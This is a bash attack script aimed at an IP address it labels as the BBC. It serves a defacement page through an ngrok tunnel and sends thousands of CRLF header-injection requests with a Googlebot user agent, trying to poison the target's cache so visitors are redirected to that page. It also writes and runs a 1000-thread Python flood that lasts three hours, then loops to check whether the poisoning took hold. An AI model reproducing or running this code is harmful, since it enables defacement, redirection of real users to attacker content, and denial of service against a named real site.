#!/bin/bash


set -e  # NO -u pipefail che uccide tutto

TARGET="http://132.185.210.70:80"
HTML_FILE="$(pwd)/TRUSTEDF57.html"
THREADS=1500
BLAST_DURATION=10800

echo "💀 BBC NGROK FINAL KILLER - NO DEATH EDITION"
echo "Target: $TARGET"
echo "HTML: $HTML_FILE"

# 1. NGROK APT (SURVIVE MODE)
install_ngrok() {
    echo "[1/5] 🔧 NGROK APT..."
    if ! command -v ngrok >/dev/null 2>&1; then
        echo "Installing ngrok repo..."
        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
        echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list >/dev/null
        sudo apt-get update -qq
        sudo apt-get install ngrok -yqq
    fi
    ngrok version && echo "✅ NGROK OK"
}

# 2. SERVER + NGROK (NO KILL)
start_tunnel() {
    echo "[2/5] 🌐 SERVER + TUNNEL..."
    
    # Check HTML
    if [[ ! -f "$HTML_FILE" ]]; then
        echo "❌ NO $HTML_FILE!"
        ls -la *.html || echo "No HTML files"
        exit 1
    fi
    
    # Gentle kill
    pkill -f "http.server 8080" 2>/dev/null || true
    sleep 2
    
    # Server
    python3 -m http.server 8080 --bind 0.0.0.0 &
    SERVER_PID=$!
    echo "Server PID: $SERVER_PID"
    sleep 3
    
    # Ngrok
    pkill ngrok 2>/dev/null || true
    sleep 2
    ngrok http 8080 > ngrok.log 2>&1 &
    NGROK_PID=$!
    echo "Ngrok PID: $NGROK_PID"
    sleep 20
    
    # Get URL
    NGROK_URL=$(grep -oE 'https://[a-z0-9-]+\.(ngrok-free\.app|ngrok\.io|ngrok\.app)' ngrok.log | tail -1)
    [[ -z "$NGROK_URL" ]] && { echo "❌ No URL:"; cat ngrok.log; exit 1; }
    
    DEFACE_URL="${NGROK_URL}/TRUSTEDF57.html"
    echo "✅ LIVE: $DEFACE_URL"
    
    curl -s "$DEFACE_URL" | head -1 || echo "⚠️ Test fail"
}

# 3. BBC POISON BLAST
bbc_poison() {
    echo "[3/5] 💣 BBC POISON 10K..."
    PAYLOAD="%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
    
    # Fast 10K shots
    for i in {1..1000}; do
        curl -s -m 2 "${TARGET}/?q=${PAYLOAD}" \
            -H "User-Agent: Googlebot/2.1" &
        [[ $((i%100)) -eq 0 ]] && echo "$i/10000"
    done
    wait
    echo "✅ POISON FIRED!"
}

# 4. DESTROYER
start_destroyer() {
    echo "[4/5] 🔥 DESTROYER..."
    cat > killer.py << EOF
import requests,threading,time,random
TARGET="$TARGET/?q="
URL="$DEFACE_URL"
def hit():
 while 1:
  try:
   requests.get(TARGET+"%0d%0aLocation: "+URL,timeout=1)
  except:pass
for _ in range(1000):threading.Thread(target=hit,daemon=True).start()
print("🔥 1000 THREADS RUNNING...")
time.sleep($BLAST_DURATION)
EOF
    nohup python3 killer.py > killer.log 2>&1 &
    echo "Destroyer PID: $! | tail -f killer.log"
}

# 5. MONITOR LOOP
monitor() {
    echo "[5/5] 🎯 MONITOR (Ctrl+C OK)..."
    while true; do
        clear
        echo "BBC STATUS - $(date)"
        echo "DEFACE: $DEFACE_URL"
        echo "─────────────────────"
        echo "TARGET:"
        curl -s -I "$TARGET/?q=" 2>/dev/null | grep -iE "Location|Cache|ngrok" || echo "No poison"
        echo "NGROK:"
        curl -s "$DEFACE_URL" 2>/dev/null | head -1 || echo "Ngrok down"
        sleep 10
    done
}

# NO TRAP - MANUAL CLEANUP
echo ""
echo "======================="
echo "STEPS COMPLETE - RUNNING"
echo "Kill: pkill -f http.server; pkill ngrok; pkill python3 killer.py"
echo "======================="

install_ngrok
start_tunnel
bbc_poison
start_destroyer
monitor
